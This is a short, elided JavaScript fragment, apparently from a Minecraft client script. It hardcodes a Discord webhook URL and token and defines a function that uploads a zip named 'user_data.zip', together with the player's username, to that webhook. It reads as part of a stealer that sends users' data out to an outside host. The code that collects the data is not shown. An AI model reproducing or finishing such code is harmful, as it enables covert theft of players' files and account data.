const WEBHOOK_URL = "https://discord.com/api/webhooks/1378446020081483920/rFlfeh2ji1DtSajPiBU-yD59D8UGSTrSr098yU169WMy8LVEQfqNCo6hcnzzDM2BZBYP";
...
function sendZipToWebhook(zipFile) {
    ...
    let usernamea = Player.getName();    
    const out = connection.getOutputStream();
    try {
        let formData = "--" + boundary + "\r\n";
        formData += 'Content-Disposition: form-data; name="file"; filename="user_data.zip"\r\n';
